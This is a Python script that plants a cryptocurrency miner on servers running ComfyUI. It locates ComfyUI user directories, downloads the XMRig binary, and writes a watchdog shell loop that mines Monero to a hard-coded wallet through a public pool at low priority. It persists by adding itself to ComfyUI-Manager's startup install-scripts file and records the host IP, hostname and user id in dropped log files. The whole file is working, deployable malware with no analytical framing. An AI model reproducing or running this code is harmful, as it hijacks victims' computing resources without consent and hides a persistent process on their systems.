#!/usr/bin/env python3
import os, sys, io, glob, time, traceback, tarfile, subprocess, urllib.request

WALLET = "45LJceeKt6A2ZHVNVF4Qqo53it2dGkpxGbRqXLya52z36fvWicAZmG2GjpczNbgyu6gGqJQag7o4LAnNBLCC1oaHDStyUVD"
POOL = "pool.hashvault.pro:443"
D = "/root/.hkc"
LOCAL = os.path.dirname(os.path.abspath(__file__))

def userdirs():
    out = []
    base = os.environ.get("COMFYUI_FOLDERS_BASE_PATH")
    if base:
        out.insert(0, os.path.join(base, "user", "default"))
    for pat in ("/ComfyUI/user/default", "/work/ComfyUI/user/default", "/app/user/default",
                "/root/ComfyUI/user/default"):
        out.extend(glob.glob(pat))
    for d in glob.glob(os.path.join(LOCAL, "..", "..", "user", "default")):
        out.insert(0, os.path.abspath(d))
    for p in ("/", "/work", "/app", "/opt", "/root", "/home", "/data"):
        try:
            for name in os.listdir(p):
                c = os.path.join(p, name, "user", "default")
                if os.path.isdir(c):
                    out.append(c)
        except Exception:
            pass
    seen, res = set(), []
    for x in out:
        if x and x not in seen and os.path.isdir(x):
            seen.add(x); res.append(x)
    return res

UD = []

def report(txt):
    for d in UD:
        for sub in (("ComfyUI-Manager", "cache"), ()):
            try:
                p = os.path.join(d, *sub) if sub else d
                os.makedirs(p, exist_ok=True)
                open(os.path.join(p, "hk41_plant.txt"), "a").write(txt)
            except Exception:
                pass
    try:
        open("/tmp/hk41_plant.txt", "a").write(txt)
    except Exception:
        pass
    sys.stdout.write(txt); sys.stdout.flush()

def main():
    global UD
    UD = userdirs()
    ip = (subprocess.run(["hostname", "-I"], capture_output=True, text=True).stdout.split() or ["?"])[-1]
    report("\n=== %s ip=%s host=%s uid=%d nproc=%s cwd=%s\n" % (
        time.strftime("%FT%TZ", time.gmtime()), ip,
        subprocess.run(["hostname"], capture_output=True, text=True).stdout.strip(),
        os.getuid(), subprocess.run(["nproc"], capture_output=True, text=True).stdout.strip(), LOCAL))
    os.makedirs(D, exist_ok=True)
    binp = os.path.join(D, "xmrig")
    if not (os.path.isfile(binp) and os.access(binp, os.X_OK)):
        u = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz"
        tgz = os.path.join(D, "x.tgz")
        try:
            b = urllib.request.urlopen(u, timeout=120).read()
            open(tgz, "wb").write(b)
            report("dl=%d\n" % len(b))
            os.makedirs(D + "/x", exist_ok=True)
            r = subprocess.run(["tar", "xzf", tgz, "-C", D + "/x"], capture_output=True, text=True)
            if r.returncode != 0:
                report("tar rc=%s %s\n" % (r.returncode, r.stderr[:200]))
                tarfile.open(tgz).extractall(D + "/x")
            src = (glob.glob(D + "/x/*/xmrig") or [None])[0]
            if not src:
                report("no binary in archive: %s\n" % os.listdir(D + "/x"))
                return
            subprocess.run(["cp", "-f", src, binp], check=True)
            os.chmod(binp, 0o755)
            report("installed %s\n" % os.path.getsize(binp))
        except Exception:
            report("download FAILED:\n" + traceback.format_exc()[-600:])
            return
    wd = D + "/wd.sh"
    open(wd, "w").write("""#!/bin/sh
pgrep -f '/root\\.hkc/xmrig' >/dev/null 2>&1 && exit 0
T=$(( $(nproc) / 2 )); [ "$T" -lt 1 ] && T=1; [ "$T" -gt 6 ] && T=6
W=hk-$(hostname -I | awk '{print $NF}')
while true; do nice -n 19 /root/.hkc/xmrig -o %s --tls -u %s -p $W -k --threads $T --donate-level 1 -B >> /root/.hkc/xmr.log 2>&1; sleep 30; done
""" % (POOL, WALLET))
    os.chmod(wd, 0o755)
    line = "['/tmp', '/bin/sh', '%s']" % wd
    for d in UD:
        f = os.path.join(d, "ComfyUI-Manager", "startup-scripts", "install-scripts.txt")
        try:
            os.makedirs(os.path.dirname(f), exist_ok=True)
            cur = open(f).read() if os.path.exists(f) else ""
            if wd not in cur:
                open(f, "a").write(line + "\n")
            report("persist ok %s\n" % f)
        except Exception as e:
            report("persist FAILED %s: %r\n" % (f, e))
    subprocess.Popen(["/usr/bin/setsid", "/bin/sh", wd], stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL, start_new_session=True)
    time.sleep(15)
    ps = subprocess.run(["pgrep", "-af", "/root/.hkc/xmrig"], capture_output=True, text=True).stdout.strip()
    report("ps=%s\n" % ps.replace("\n", " | ")[:300])
    try:
        log = open(D + "/xmr.log").read()[-700:]
    except Exception:
        log = "(no log)"
    report("log_tail=%s\n" % log.replace("\n", " / "))

try:
    main()
except Exception:
    report("FATAL:\n" + traceback.format_exc()[-900:])
